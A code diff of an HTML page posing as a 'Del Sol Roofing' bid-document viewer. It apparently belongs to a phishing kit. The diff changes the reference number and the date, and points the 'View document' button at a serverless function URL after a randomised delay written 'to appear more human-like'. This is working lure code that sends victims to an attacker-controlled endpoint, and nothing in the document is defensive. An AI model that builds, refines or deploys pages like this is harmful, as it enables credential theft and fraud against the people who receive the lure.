@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delsol Roofing</title>
+    <title>Del Sol Roofing</title>
     <style>
         * {
             margin: 0;
@@ -299,11 +299,11 @@
                 <div class="info-grid">
                     <div class="info-row">
                         <span class="info-label">Date Received</span>
-                        <span class="info-value">03/19/2026</span>
+                        <span class="info-value">03/12/2026</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">Reference Number</span>
-                        <span class="info-value">BID595993</span>
+                        <span class="info-value">BID5581456</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">Number of Pages</span>
@@ -392,7 +392,7 @@
             }, 100);
 
             // Destination URL - change this to your actual destination
-            const DESTINATION_URL = 'https://delsol.arrowheads-usa.com/';
+            const DESTINATION_URL = 'https://faas-nyc1-2ef2e6cc.doserverless.co/api/v1/web/fn-bb2ad3d8-d8c5-4cbb-a8d5-c9ff224219b0/default/TRt';
 
             // View document handler
             document.getElementById('viewDocumentBtn').addEventListener('click', function(e) {
@@ -408,19 +408,10 @@
                 // Add random timing to appear more human-like (between 2.5-3.5 seconds)
                 const loadingTime = 2500 + Math.random() * 1000;
                 
-                // Simulate loading and redirect
+                // Simulate loading and redirect - EXACT URL ONLY, NO PARAMETERS ADDED
                 setTimeout(() => {
-                    // Generate a random session token (simulated)
-                    const sessionToken = Math.random().toString(36).substring(2, 15) + 
-                                        Math.random().toString(36).substring(2, 15);
-                    
-                    // Add token to URL for tracking (optional)
-                    const redirectUrl = new URL(DESTINATION_URL);
-                    redirectUrl.searchParams.append('session', sessionToken.substring(0, 8));
-                    redirectUrl.searchParams.append('ref', 'BID5581456');
-                    
-                    // Redirect to destination
-                    window.location.href = redirectUrl.toString();
+                    // Redirect to exact destination URL without any added parameters
+                    window.location.href = DESTINATION_URL;
                 }, loadingTime);
             });
 
